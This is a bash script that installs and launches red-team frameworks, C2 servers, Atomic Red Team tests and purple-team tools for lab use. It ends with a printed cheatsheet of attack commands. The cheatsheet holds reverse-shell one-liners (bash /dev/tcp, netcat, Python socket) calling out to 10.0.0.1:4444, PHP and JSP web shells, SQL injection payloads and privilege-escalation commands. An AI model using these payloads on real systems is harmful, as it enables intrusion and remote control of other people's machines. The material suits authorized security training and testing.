#!/usr/bin/env bash

# ============================================================================
#                   ULTIMATE RED TEAM AUTOMATION SCRIPT v3.0
# ============================================================================
# Enhanced with comprehensive features, proper error handling, and all tools
# Integrates MITRE Caldera, Atomic Red Team, Purple Team Tools, and more
# Author: Enhanced Security Framework
# License: Educational Use Only
# ============================================================================

# ======================= SAFETY & EDUCATIONAL WARNING =======================
echo -e "${RED}${BOLD}WARNING: This script is for EDUCATIONAL USE ONLY.\n"
echo -e "Run ONLY in isolated VMs or test environments.\n"
echo -e "Unauthorized use is strictly prohibited.\n${NC}"

# VM detection (basic)
if command -v systemd-detect-virt &>/dev/null; then
    if ! systemd-detect-virt --vm &>/dev/null; then
        echo -e "${YELLOW}[*] It appears you are NOT running in a VM.\nPlease use a virtual machine for safety.${NC}"
        read -p "Continue anyway? [y/N]: " answer
        if [[ ! "$answer" =~ ^[Yy]$ ]]; then
            echo -e "${RED}Exiting for safety.${NC}"
            exit 1
        fi
    fi
fi
# ============================================================================

# Global Configuration
VERSION="3.0"
SCRIPT_NAME="Ultimate Red Team Automation"
CONFIG_FILE="$HOME/.redteam_config"
LOG_FILE="$HOME/redteam_automation.log"
TEMP_DIR="/tmp/redteam_$(date +%s)"
BACKUP_DIR="$HOME/.redteam_backups"
TOOLS_DIR="$HOME/redteam_tools"

# Color Schemes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Process tracking
CALDERA_PID=""
EMPIRE_PID=""
COVENANT_PID=""

# Create necessary directories
mkdir -p "$TEMP_DIR" "$BACKUP_DIR" "$TOOLS_DIR"

# ============================================================================
#                           LOGGING AND UTILITIES
# ============================================================================

log() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    
    echo -e "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case $level in
        "ERROR")
            echo -e "${RED}[!] ERROR:${NC} $message"
            ;;
        "WARNING")
            echo -e "${YELLOW}[!] WARNING:${NC} $message"
            ;;
        "INFO")
            echo -e "${GREEN}[+] INFO:${NC} $message"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[✓] SUCCESS:${NC} $message"
            ;;
        "DEBUG")
            if [[ "$DEBUG_MODE" == "true" ]]; then
                echo -e "${CYAN}[*] DEBUG:${NC} $message"
            fi
            ;;
        *)
            echo -e "${WHITE}[*]${NC} $message"
            ;;
    esac
}

banner() {
    clear
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                    ULTIMATE RED TEAM AUTOMATION v$VERSION                        ║"
    echo "║                         Enhanced Security Framework                          ║"
    echo "╠══════════════════════════════════════════════════════════════════════════════╣"
    echo "║  Comprehensive MITRE ATT&CK Framework Implementation                        ║"
    echo "║  Educational Use Only - Authorized Personnel Only                           ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        log "WARNING" "Running as root. Some operations may be restricted for security."
        read -p "Continue as root? (y/n): " root_choice
        if [[ ! "$root_choice" =~ [yY] ]]; then
            log "INFO" "Exiting for security reasons."
            exit 0
        fi
    fi
}

check_dependencies() {
    local missing=0
    local deps=("git" "python3" "pip3" "curl" "wget" "jq" "yq" "docker" "go" "node" "npm")
    
    log "INFO" "Checking system dependencies..."
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            log "WARNING" "Dependency $dep not found"
            missing=$((missing + 1))
        else
            log "DEBUG" "Found dependency: $dep"
        fi
    done
    
    if [[ "$missing" -gt 0 ]]; then
        log "WARNING" "$missing dependencies missing. Installing..."
        install_dependencies
    else
        log "SUCCESS" "All dependencies found"
    fi
}

detect_os() {
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS_NAME="$ID"
        OS_VERSION="$VERSION_ID"
        OS_PRETTY="$PRETTY_NAME"
    elif [[ -f /etc/redhat-release ]]; then
        OS_NAME="rhel"
        OS_PRETTY=$(cat /etc/redhat-release)
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS_NAME="macos"
        OS_PRETTY="macOS $(sw_vers -productVersion)"
    else
        OS_NAME="unknown"
        OS_PRETTY="Unknown OS"
    fi
    
    # Check if it's RedHunt OS
    if [[ "$OS_PRETTY" == *"RedHunt"* ]] || [[ -f /usr/share/redhunt-os/version ]]; then
        OS_NAME="redhunt"
        OS_PRETTY="RedHunt OS"
        log "INFO" "Detected RedHunt OS - Security-focused distribution"
    fi
    
    # Check for snap support
    if command -v snap &> /dev/null; then
        SNAP_AVAILABLE=true
        log "DEBUG" "Snap package manager available"
    else
        SNAP_AVAILABLE=false
    fi
    
    log "INFO" "Detected OS: $OS_PRETTY"
}

install_dependencies() {
    log "INFO" "Installing missing dependencies..."
    detect_os
    
    case $OS_NAME in
        "ubuntu"|"debian"|"redhunt")
            sudo apt update
            sudo apt install -y git python3 python3-pip curl wget jq docker.io golang nodejs npm \
                               build-essential cmake make gcc g++ libssl-dev pkg-config \
                               net-tools nmap masscan gobuster nikto dirb hashcat john \
                               metasploit-framework sqlmap wireshark tcpdump
            
            # Install yq for YAML processing
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            
            # Install snap packages if available
            if [[ "$SNAP_AVAILABLE" == "true" ]]; then
                sudo snap install code --classic 2>/dev/null || true
                sudo snap install discord 2>/dev/null || true
                sudo snap install postman 2>/dev/null || true
            fi
            
            # RedHunt OS specific tools
            if [[ "$OS_NAME" == "redhunt" ]]; then
                log "INFO" "Installing RedHunt OS specific security tools..."
                sudo apt install -y zaproxy burpsuite maltego recon-ng theharvester \
                                   aircrack-ng kismet wifite social-engineer-toolkit \
                                   beef-xss armitage backdoor-factory veil-framework
            fi
            ;;
        "fedora"|"centos"|"rhel")
            sudo dnf install -y git python3 python3-pip curl wget jq docker golang nodejs npm \
                               gcc gcc-c++ make cmake openssl-devel pkg-config \
                               nmap masscan nikto hashcat john
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            ;;
        "arch")
            sudo pacman -S --noconfirm git python python-pip curl wget jq docker go nodejs npm \
                                      gcc make cmake openssl pkg-config \
                                      nmap masscan nikto hashcat john-jumbo
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            ;;
        "macos")
            if command -v brew &> /dev/null; then
                brew install git python3 curl wget jq yq docker golang node npm \
                           nmap masscan nikto hashcat john
            else
                log "ERROR" "Homebrew not found. Please install Homebrew first."
                return 1
            fi
            ;;
        *)
            log "WARNING" "Unsupported OS: $OS_NAME. Please install dependencies manually."
            return 1
            ;;
    esac
    
    # Install Python security libraries
    pip3 install --user requests beautifulsoup4 lxml colorama termcolor pycryptodome \
                        scapy netaddr python-nmap dnspython pexpect paramiko \
                        impacket bloodhound py2neo neo4j-driver
}

init_config() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
        log "INFO" "Creating configuration file at $CONFIG_FILE"
        cat > "$CONFIG_FILE" <<- EOM
# Ultimate Red Team Automation Configuration
VERSION="$VERSION"
TOOLS_DIR="$TOOLS_DIR"
CALDERA_DIR="$TOOLS_DIR/caldera"
ATOMIC_RED_TEAM_DIR="$TOOLS_DIR/atomic-red-team"
EMPIRE_DIR="$TOOLS_DIR/Empire"
COVENANT_DIR="$TOOLS_DIR/Covenant"
SLIVER_DIR="$TOOLS_DIR/sliver"
MYTHIC_DIR="$TOOLS_DIR/Mythic"
HAVOC_DIR="$TOOLS_DIR/Havoc"
MERLIN_DIR="$TOOLS_DIR/merlin"
METASPLOIT_DIR="/opt/metasploit-framework"
COBALT_STRIKE_DIR="$TOOLS_DIR/cobaltstrike"
DEBUG_MODE="false"
AUTO_UPDATE="true"
BACKUP_ENABLED="true"
EOM
    fi
    
    source "$CONFIG_FILE"
    log "SUCCESS" "Configuration loaded from $CONFIG_FILE"
}

# ============================================================================
#                           MITRE CALDERA OPERATIONS
# ============================================================================

install_caldera() {
    log "INFO" "Starting Caldera installation..."
    
    if [[ -d "$CALDERA_DIR" ]]; then
        log "INFO" "Caldera directory already exists at $CALDERA_DIR"
        read -p "Do you want to update Caldera? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            update_caldera
            return $?
        else
            return 0
        fi
    fi
    
    log "INFO" "Cloning Caldera repository..."
    git clone https://github.com/mitre/caldera.git --recursive "$CALDERA_DIR"
    
    if [[ $? -ne 0 ]]; then
        log "ERROR" "Failed to clone Caldera repository"
        return 1
    fi
    
    cd "$CALDERA_DIR" || return 1
    
    # Install Python dependencies
    log "INFO" "Installing Python dependencies..."
    pip3 install -r requirements.txt
    
    if [[ $? -ne 0 ]]; then
        log "ERROR" "Failed to install Python dependencies"
        return 1
    fi
    
    # Install additional plugins
    install_caldera_plugins
    
    log "SUCCESS" "Caldera installation complete"
    cd - || return 1
    return 0
}

update_caldera() {
    log "INFO" "Updating Caldera..."
    cd "$CALDERA_DIR" || return 1
    
    # Backup current configuration
    if [[ "$BACKUP_ENABLED" == "true" ]]; then
        backup_dir="$BACKUP_DIR/caldera_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$backup_dir"
        cp -r conf/ "$backup_dir/" 2>/dev/null
        log "INFO" "Configuration backed up to $backup_dir"
    fi
    
    git pull --recurse-submodules
    pip3 install -r requirements.txt --upgrade
    
    log "SUCCESS" "Caldera updated successfully"
    cd - || return 1
    return 0
}

install_caldera_plugins() {
    log "INFO" "Installing Caldera plugins..."
    
    local plugins=(
        "https://github.com/mitre/stockpile.git"
        "https://github.com/mitre/sandcat.git"
        "https://github.com/mitre/manx.git"
        "https://github.com/mitre/response.git"
        "https://github.com/mitre/atomic.git"
        "https://github.com/mitre/training.git"
        "https://github.com/mitre/compass.git"
        "https://github.com/mitre/emu.git"
        "https://github.com/mitre/mock.git"
        "https://github.com/mitre/gameboard.git"
    )
    
    cd "$CALDERA_DIR/plugins" || return 1
    
    for plugin in "${plugins[@]}"; do
        local plugin_name=$(basename "$plugin" .git)
        if [[ ! -d "$plugin_name" ]]; then
            log "INFO" "Installing plugin: $plugin_name"
            git clone "$plugin"
            
            if [[ $? -eq 0 ]]; then
                # Install plugin dependencies if they exist
                if [[ -f "$plugin_name/requirements.txt" ]]; then
                    pip3 install -r "$plugin_name/requirements.txt"
                fi
                log "SUCCESS" "Plugin $plugin_name installed"
            else
                log "ERROR" "Failed to install plugin: $plugin_name"
            fi
        else
            log "DEBUG" "Plugin $plugin_name already exists"
        fi
    done
    
    cd - || return 1
    log "SUCCESS" "Plugin installation complete"
}

start_caldera() {
    log "INFO" "Starting Caldera server..."
    
    if [[ ! -d "$CALDERA_DIR" ]]; then
        log "ERROR" "Caldera not found. Please install Caldera first."
        return 1
    fi
    
    # Check if already running
    if pgrep -f "python.*server.py" > /dev/null; then
        log "WARNING" "Caldera server appears to be running"
        local existing_pid=$(pgrep -f "python.*server.py")
        log "INFO" "Existing process PID: $existing_pid"
        read -p "Kill existing process and start new one? (y/n): " kill_choice
        if [[ "$kill_choice" =~ [yY] ]]; then
            kill "$existing_pid"
            sleep 2
        else
            return 1
        fi
    fi
    
    cd "$CALDERA_DIR" || return 1
    
    # Configuration options
    local cmd="python3 server.py --insecure"
    
    echo -e "${CYAN}Caldera Configuration Options:${NC}"
    read -p "Enable debug mode? (y/n): " debug_choice
    if [[ "$debug_choice" =~ [yY] ]]; then
        cmd="$cmd --log DEBUG"
    fi
    
    read -p "Custom port (default 8888): " port_choice
    if [[ -n "$port_choice" ]]; then
        cmd="$cmd --port $port_choice"
    fi
    
    read -p "Enable plugin auto-update? (y/n): " update_choice
    if [[ "$update_choice" =~ [yY] ]]; then
        cmd="$cmd --build"
    fi
    
    log "INFO" "Starting Caldera with command: $cmd"
    $cmd &
    CALDERA_PID=$!
    
    sleep 3
    
    if kill -0 "$CALDERA_PID" 2>/dev/null; then
        log "SUCCESS" "Caldera server started with PID $CALDERA_PID"
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║           CALDERA SERVER INFO          ║${NC}"
        echo -e "${GREEN}╠════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║ PID:${NC} $CALDERA_PID"
        echo -e "${GREEN}║ URL:${NC} http://localhost:${port_choice:-8888}"
        echo -e "${GREEN}║ Default Login:${NC} red/admin"
        echo -e "${GREEN}║ Blue Team:${NC} blue/admin"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
    else
        log "ERROR" "Failed to start Caldera server"
        return 1
    fi
    
    cd - || return 1
    return 0
}

stop_caldera() {
    log "INFO" "Stopping Caldera server..."
    
    if [[ -n "$CALDERA_PID" ]] && kill -0 "$CALDERA_PID" 2>/dev/null; then
        kill "$CALDERA_PID"
        wait "$CALDERA_PID" 2>/dev/null
        log "SUCCESS" "Caldera server stopped"
        unset CALDERA_PID
    else
        local running_pids=$(pgrep -f "python.*server.py")
        if [[ -n "$running_pids" ]]; then
            log "INFO" "Found running Caldera processes: $running_pids"
            read -p "Stop all Caldera processes? (y/n): " stop_choice
            if [[ "$stop_choice" =~ [yY] ]]; then
                echo "$running_pids" | xargs kill
                log "SUCCESS" "All Caldera processes stopped"
            fi
        else
            log "INFO" "No running Caldera processes found"
        fi
    fi
}

# ============================================================================
#                        ATOMIC RED TEAM OPERATIONS
# ============================================================================

install_atomic_red_team() {
    log "INFO" "Installing Atomic Red Team..."
    
    if [[ -d "$ATOMIC_RED_TEAM_DIR" ]]; then
        log "INFO" "Atomic Red Team already exists"
        read -p "Update Atomic Red Team? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            cd "$ATOMIC_RED_TEAM_DIR" || return 1
            git pull
            log "SUCCESS" "Atomic Red Team updated"
            cd - || return 1
        fi
        return 0
    fi
    
    git clone https://github.com/redcanaryco/atomic-red-team.git "$ATOMIC_RED_TEAM_DIR"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Atomic Red Team installed successfully"
        
        # Install Invoke-AtomicRedTeam PowerShell module if on compatible system
        if command -v pwsh &> /dev/null; then
            log "INFO" "Installing Invoke-AtomicRedTeam PowerShell module..."
            pwsh -Command "Install-Module -Name invoke-atomicredteam -Force -Scope CurrentUser"
        fi
    else
        log "ERROR" "Failed to install Atomic Red Team"
        return 1
    fi
}

list_atomic_techniques() {
    local tactic=$1
    
    if [[ ! -d "$ATOMIC_RED_TEAM_DIR" ]]; then
        log "ERROR" "Atomic Red Team not installed"
        return 1
    fi
    
    log "INFO" "Listing techniques for tactic: $tactic"
    
    local technique_files=$(find "$ATOMIC_RED_TEAM_DIR/atomics" -name "T*.yaml" 2>/dev/null)
    
    if [[ -z "$technique_files" ]]; then
        log "ERROR" "No technique files found"
        return 1
    fi
    
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}              ATOMIC RED TEAM TECHNIQUES                        ${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    
    for file in $technique_files; do
        local technique_id=$(basename "$file" .yaml)
        if [[ -f "$file" ]]; then
            local technique_name=$(yq eval '.display_name // "Unknown"' "$file" 2>/dev/null)
            local test_count=$(yq eval '.atomic_tests | length' "$file" 2>/dev/null)
            
            echo -e "${BLUE}$technique_id${NC}: $technique_name"
            echo -e "  ${YELLOW}Tests available:${NC} $test_count"
            
            # Show first few test names
            local tests=$(yq eval '.atomic_tests[0:2][].name' "$file" 2>/dev/null)
            if [[ -n "$tests" ]]; then
                echo -e "  ${CYAN}Sample tests:${NC}"
                echo "$tests" | while read -r test; do
                    echo -e "    - $test"
                done
            fi
            echo
        fi
    done
}

run_atomic_test() {
    local technique_id=$1
    local test_guid=$2
    
    if [[ ! -d "$ATOMIC_RED_TEAM_DIR" ]]; then
        log "ERROR" "Atomic Red Team not installed"
        return 1
    fi
    
    local test_file="$ATOMIC_RED_TEAM_DIR/atomics/$technique_id/$technique_id.yaml"
    
    if [[ ! -f "$test_file" ]]; then
        log "ERROR" "Test file not found: $test_file"
        return 1
    fi
    
    log "INFO" "Analyzing test: $technique_id - $test_guid"
    
    # Extract test information
    local test_info=$(yq eval ".atomic_tests[] | select(.auto_generated_guid == \"$test_guid\")" "$test_file" 2>/dev/null)
    
    if [[ -z "$test_info" ]]; then
        log "ERROR" "Test with GUID $test_guid not found"
        return 1
    fi
    
    local test_name=$(echo "$test_info" | yq eval '.name')
    local test_description=$(echo "$test_info" | yq eval '.description')
    local executor=$(echo "$test_info" | yq eval '.executor.name')
    local command=$(echo "$test_info" | yq eval '.executor.command')
    
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                    ATOMIC TEST DETAILS                        ${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}Technique:${NC} $technique_id"
    echo -e "${BLUE}Test Name:${NC} $test_name"
    echo -e "${BLUE}Description:${NC} $test_description"
    echo -e "${BLUE}Executor:${NC} $executor"
    echo -e "${BLUE}Command:${NC}"
    echo -e "${YELLOW}$command${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    
    echo -e "${RED}⚠️  WARNING: This will execute potentially harmful commands! ⚠️${NC}"
    read -p "Are you sure you want to execute this test? (type 'EXECUTE' to confirm): " confirmation
    
    if [[ "$confirmation" == "EXECUTE" ]]; then
        log "WARNING" "Executing Atomic Test: $test_name"
        
        case $executor in
            "bash"|"sh")
                eval "$command"
                ;;
            "command_prompt")
                cmd.exe /c "$command"
                ;;
            "powershell")
                if command -v pwsh &> /dev/null; then
                    pwsh -Command "$command"
                else
                    powershell -Command "$command"
                fi
                ;;
            "python")
                python3 -c "$command"
                ;;
            *)
                log "ERROR" "Unsupported executor: $executor"
                return 1
                ;;
        esac
        
        if [[ $? -eq 0 ]]; then
            log "SUCCESS" "Test executed successfully"
        else
            log "ERROR" "Test execution failed"
        fi
    else
        log "INFO" "Test execution cancelled"
    fi
}

# ============================================================================
#                         C2 FRAMEWORK OPERATIONS
# ============================================================================

install_empire() {
    log "INFO" "Installing PowerShell Empire..."
    
    if [[ -d "$EMPIRE_DIR" ]]; then
        log "INFO" "Empire already exists"
        read -p "Update Empire? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            cd "$EMPIRE_DIR" || return 1
            git pull
            pip3 install -r requirements.txt --upgrade
            log "SUCCESS" "Empire updated"
            cd - || return 1
        fi
        return 0
    fi
    
    git clone --recursive https://github.com/EmpireProject/Empire.git "$EMPIRE_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$EMPIRE_DIR" || return 1
        pip3 install -r requirements.txt
        ./install.sh
        log "SUCCESS" "Empire installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Empire"
        return 1
    fi
}

install_covenant() {
    log "INFO" "Installing Covenant C2..."
    
    if [[ -d "$COVENANT_DIR" ]]; then
        log "INFO" "Covenant already exists"
        return 0
    fi
    
    if ! command -v dotnet &> /dev/null; then
        log "INFO" "Installing .NET Core..."
        wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
        sudo dpkg -i packages-microsoft-prod.deb
        sudo apt-get update
        sudo apt-get install -y dotnet-sdk-6.0
    fi
    
    git clone --recurse-submodules https://github.com/cobbr/Covenant.git "$COVENANT_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$COVENANT_DIR/Covenant" || return 1
        dotnet build
        log "SUCCESS" "Covenant installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Covenant"
        return 1
    fi
}

install_sliver() {
    log "INFO" "Installing Sliver C2..."
    
    if [[ -f "$TOOLS_DIR/sliver-server" ]]; then
        log "INFO" "Sliver already installed"
        return 0
    fi
    
    local sliver_url=""
    case $(uname -m) in
        x86_64)
            sliver_url="https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux"
            ;;
        arm64|aarch64)
            sliver_url="https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux-arm64"
            ;;
        *)
            log "ERROR" "Unsupported architecture for Sliver"
            return 1
            ;;
    esac
    
    wget "$sliver_url" -O "$TOOLS_DIR/sliver-server"
    chmod +x "$TOOLS_DIR/sliver-server"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Sliver installed successfully"
    else
        log "ERROR" "Failed to install Sliver"
        return 1
    fi
}

install_mythic() {
    log "INFO" "Installing Mythic C2..."
    
    if [[ -d "$MYTHIC_DIR" ]]; then
        log "INFO" "Mythic already exists"
        return 0
    fi
    
    git clone https://github.com/its-a-feature/Mythic.git "$MYTHIC_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$MYTHIC_DIR" || return 1
        sudo ./install_docker_ubuntu.sh
        make
        log "SUCCESS" "Mythic installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Mythic"
        return 1
    fi
}

# ============================================================================
#                         PURPLE TEAM TOOLS
# ============================================================================

install_purple_team_tools() {
    log "INFO" "Installing Purple Team Tools..."
    
    # VECTR
    if [[ ! -d "$TOOLS_DIR/VECTR" ]]; then
        log "INFO" "Installing VECTR..."
        git clone https://github.com/SecurityRiskAdvisors/VECTR.git "$TOOLS_DIR/VECTR"
    fi
    
    # Atomic Purple
    if [[ ! -d "$TOOLS_DIR/atomic-purple" ]]; then
        log "INFO" "Installing Atomic Purple..."
        git clone https://github.com/mvelazc0/atomic-purple.git "$TOOLS_DIR/atomic-purple"
    fi
    
    # Mordor
    if [[ ! -d "$TOOLS_DIR/mordor" ]]; then
        log "INFO" "Installing Mordor..."
        git clone https://github.com/OTRF/mordor.git "$TOOLS_DIR/mordor"
    fi
    
    # Detection Lab
    if [[ ! -d "$TOOLS_DIR/DetectionLab" ]]; then
        log "INFO" "Installing Detection Lab..."
        git clone https://github.com/clong/DetectionLab.git "$TOOLS_DIR/DetectionLab"
    fi
    
    log "SUCCESS" "Purple Team Tools installation complete"
}

# ============================================================================
#                         THREAT HUNTING TOOLS
# ============================================================================

install_threat_hunting_tools() {
    log "INFO" "Installing Threat Hunting Tools..."
    
    # HELK
    if [[ ! -d "$TOOLS_DIR/HELK" ]]; then
        log "INFO" "Installing HELK..."
        git clone https://github.com/Cyb3rWard0g/HELK.git "$TOOLS_DIR/HELK"
    fi
    
    # Sigma Rules
    if [[ ! -d "$TOOLS_DIR/sigma" ]]; then
        log "INFO" "Installing Sigma Rules..."
        git clone https://github.com/SigmaHQ/sigma.git "$TOOLS_DIR/sigma"
    fi
    
    # ThreatHunter-Playbook
    if [[ ! -d "$TOOLS_DIR/ThreatHunter-Playbook" ]]; then
        log "INFO" "Installing ThreatHunter-Playbook..."
        git clone https://github.com/OTRF/ThreatHunter-Playbook.git "$TOOLS_DIR/ThreatHunter-Playbook"
    fi
    
    # Atomic Threat Coverage
    if [[ ! -d "$TOOLS_DIR/atomic-threat-coverage" ]]; then
        log "INFO" "Installing Atomic Threat Coverage..."
        git clone https://github.com/atc-project/atomic-threat-coverage.git "$TOOLS_DIR/atomic-threat-coverage"
    fi
    
    log "SUCCESS" "Threat Hunting Tools installation complete"
}

# ============================================================================
#                         ADVERSARY EMULATION
# ============================================================================

install_adversary_emulation_tools() {
    log "INFO" "Installing Adversary Emulation Tools..."
    
    # APTSimulator
    if [[ ! -d "$TOOLS_DIR/APTSimulator" ]]; then
        log "INFO" "Installing APTSimulator..."
        git clone https://github.com/NextronSystems/APTSimulator.git "$TOOLS_DIR/APTSimulator"
    fi
    
    # Metta
    if [[ ! -d "$TOOLS_DIR/Metta" ]]; then
        log "INFO" "Installing Metta..."
        git clone https://github.com/uber-common/metta.git "$TOOLS_DIR/Metta"
    fi
    
    # Red Team Automation (RTA)
    if [[ ! -d "$TOOLS_DIR/RTA" ]]; then
        log "INFO" "Installing Red Team Automation..."
        git clone https://github.com/endgameinc/RTA.git "$TOOLS_DIR/RTA"
    fi
    
    # Infection Monkey
    if [[ ! -d "$TOOLS_DIR/infection-monkey" ]]; then
        log "INFO" "Installing Infection Monkey..."
        git clone https://github.com/guardicore/monkey.git "$TOOLS_DIR/infection-monkey"
    fi
    
    log "SUCCESS" "Adversary Emulation Tools installation complete"
}

# ============================================================================
#                         SYSTEM UTILITIES
# ============================================================================

show_system_info() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                              SYSTEM INFORMATION                              ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${BLUE}Operating System:${NC}"
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        echo "  Name: $PRETTY_NAME"
        echo "  ID: $ID"
        echo "  Version: $VERSION_ID"
    fi
    
    echo -e "\n${BLUE}Hardware:${NC}"
    echo "  Architecture: $(uname -m)"
    echo "  Processor: $(nproc) cores"
    echo "  Memory: $(free -h | awk '/^Mem:/ {print $2}')"
    echo "  Disk Space: $(df -h / | awk 'NR==2 {print $4}') available"
    
    echo -e "\n${BLUE}Network:${NC}"
    echo "  Hostname: $(hostname)"
    echo "  IP Addresses:"
    if command -v ip &> /dev/null; then
        ip addr show | grep -E 'inet ' | awk '{print "    " $2 " (" $NF ")"}'
    else
        ifconfig | grep -E 'inet ' | awk '{print "    " $2}'
    fi
    
    echo -e "\n${BLUE}Security Status:${NC}"
    echo "  Current User: $(whoami)"
    echo "  Groups: $(groups)"
    echo "  Sudo Access: $(sudo -l 2>/dev/null | grep -q '(ALL)' && echo "Yes" || echo "No")"
    
    echo -e "\n${BLUE}Installed Tools:${NC}"
    [[ -d "$CALDERA_DIR" ]] && echo "  ✓ MITRE Caldera" || echo "  ✗ MITRE Caldera"
    [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && echo "  ✓ Atomic Red Team" || echo "  ✗ Atomic Red Team"
    [[ -d "$EMPIRE_DIR" ]] && echo "  ✓ PowerShell Empire" || echo "  ✗ PowerShell Empire"
    [[ -d "$COVENANT_DIR" ]] && echo "  ✓ Covenant C2" || echo "  ✗ Covenant C2"
    [[ -f "$TOOLS_DIR/sliver-server" ]] && echo "  ✓ Sliver C2" || echo "  ✗ Sliver C2"
    [[ -d "$MYTHIC_DIR" ]] && echo "  ✓ Mythic C2" || echo "  ✗ Mythic C2"
    
    read -p "Press Enter to continue..."
}

show_comprehensive_cheatsheet() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                       COMPREHENSIVE RED TEAM CHEATSHEET                     ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                            RECONNAISSANCE PHASE
═══════════════════════════════════════════════════════════════════════════════

Network Discovery:
  nmap -sn 192.168.1.0/24                    # Ping sweep
  nmap -sS -O 192.168.1.1                    # SYN scan with OS detection
  nmap -sC -sV -oA scan 192.168.1.1          # Default scripts and version detection
  masscan -p1-65535 192.168.1.0/24 --rate=1000  # Fast port scanner

DNS Enumeration:
  dig axfr @dns-server domain.com             # Zone transfer
  dnsrecon -d domain.com -t axfr              # DNS reconnaissance
  fierce -dns domain.com                      # Domain scanner
  amass enum -d domain.com                    # Asset discovery

Web Application:
  gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
  ffuf -w wordlist.txt -u http://target/FUZZ  # Fast web fuzzer
  nikto -h http://target                      # Web vulnerability scanner
  whatweb http://target                       # Web technology identifier

Active Directory:
  enum4linux -a 192.168.1.1                  # SMB enumeration
  smbclient -L //192.168.1.1                 # List SMB shares
  rpcclient -U "" 192.168.1.1                # RPC client
  ldapsearch -x -h 192.168.1.1 -s base       # LDAP enumeration

═══════════════════════════════════════════════════════════════════════════════
                              INITIAL ACCESS
═══════════════════════════════════════════════════════════════════════════════

Reverse Shells:
  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1     # Bash reverse shell
  nc -e /bin/sh 10.0.0.1 4444                # Netcat reverse shell
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Web Shells:
  <?php system($_GET['cmd']); ?>              # Simple PHP web shell
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>  # JSP web shell

SQL Injection:
  ' OR 1=1-- -                               # Basic SQLi
  ' UNION SELECT 1,2,3-- -                   # Union-based SQLi
  '; EXEC xp_cmdshell('whoami')-- -          # MSSQL command execution

═══════════════════════════════════════════════════════════════════════════════
                           PRIVILEGE ESCALATION
═══════════════════════════════════════════════════════════════════════════════

Linux:
  find / -perm -4000 -type f 2>/dev/null     # Find SUID binaries
  sudo -l                                     # Check sudo permissions
  cat /etc/passwd                            # Enumerate users
  ps aux | grep root                         # Check root processes
  crontab -l                                 # Check cron jobs
  find / -writable -type d 2>/dev/null       # Find writable directories

Windows:
  whoami /priv                               # Check privileges
  net user                                   # List users
  net localgroup administrators             # List admin users
  wmic qfe                                   # Check installed patches
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  icacls "C:\Program Files"                  # Check file permissions

Automated Tools:
  ./linpeas.sh                               # Linux privilege escalation
  ./winPEAS.exe                              # Windows privilege escalation
